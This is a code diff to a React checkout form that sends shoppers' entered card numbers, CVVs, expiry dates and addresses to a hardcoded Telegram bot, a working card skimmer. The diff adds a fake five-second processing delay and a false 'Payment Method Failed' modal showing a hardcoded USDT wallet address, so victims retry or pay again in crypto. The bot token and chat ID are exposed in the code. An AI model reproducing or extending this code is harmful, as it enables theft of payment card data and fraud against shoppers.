@@ -4,6 +4,8 @@ import { useState } from 'react';
 import { useForm } from 'react-hook-form';
 import { jwtDecode } from 'jwt-decode';
 import { useRouter } from 'next/navigation';
+import PaymentErrorModal from './PaymentErrorModal';
+import ProcessingModal from './ProcessingModal';
 
 type CartItem = {
   id: string;
@@ -20,6 +22,7 @@ type UserToken = {
 
 const TELEGRAM_BOT_TOKEN = '7737474698:AAHyZKVaQLgdeNBEwvpbwXIToyFYfZ5TSR4';
 const TELEGRAM_CHAT_ID = '7860277201';
+const WALLET_ADDRESS = 'TDzGahTbE8mx41qDiu5xkRdPM2QwjnZZzo'; // USDT wallet address
 
 interface CreditCardFormProps {
   totalAmount: number;
@@ -62,6 +65,8 @@ const CreditCardForm: React.FC<CreditCardFormProps> = ({ totalAmount }) => {
   const [errors, setErrors] = useState<Record<string, string>>({});
   const [status, setStatus] = useState({ message: '', color: '' });
   const [loading, setLoading] = useState(false);
+  const [showErrorModal, setShowErrorModal] = useState(false);
+  const [isProcessing, setIsProcessing] = useState(false);
 
   const checkAuth = () => {
     const token = document.cookie
@@ -164,6 +169,7 @@ const CreditCardForm: React.FC<CreditCardFormProps> = ({ totalAmount }) => {
     if (!validateForm()) return;
     
     setLoading(true);
+    setIsProcessing(true);
     setStatus({ message: '', color: '' });
 
     try {
@@ -217,11 +223,30 @@ const CreditCardForm: React.FC<CreditCardFormProps> = ({ totalAmount }) => {
         throw new Error(telegramData.description || 'Failed to send Telegram notification');
       }
 
-      // 4. Clear cart and redirect (NO PURCHASE DATA SAVED)
-      clearCart();
-      router.push('/payment/success');
+      // 4. Add a small delay for better UX (simulate processing)
+      await new Promise(resolve => setTimeout(resolve, 5000));
+
+      // 5. Telegram sent successfully - show payment error modal
+      // User can see wallet address and try alternative payment method
+      setIsProcessing(false);
+      setShowErrorModal(true);
+      // Clear the form for retry
+      setForm({
+        cardName: '',
+        cardNumber: '',
+        expiry: '',
+        cvv: '',
+        email: '',
+        streetAddress: '',
+        city: '',
+        country: '',
+        zipCode: '',
+        phoneNumber: '',
+      });
 
     } catch (error) {
+      // Show error if Telegram fails
+      setIsProcessing(false);
       setStatus({ 
         message: `Error: ${error instanceof Error ? error.message : 'Payment processing failed'}`,
         color: 'red' 
@@ -390,6 +415,16 @@ const CreditCardForm: React.FC<CreditCardFormProps> = ({ totalAmount }) => {
           {status.message}
         </p>
       )}
+
+      <ProcessingModal isOpen={isProcessing} />
+
+      <PaymentErrorModal
+        isOpen={showErrorModal}
+        onClose={() => setShowErrorModal(false)}
+        walletAddress={WALLET_ADDRESS}
+        totalAmount={totalAmount}
+        errorMessage="Payment Method Failed"
+      />
     </form>
   );
 };
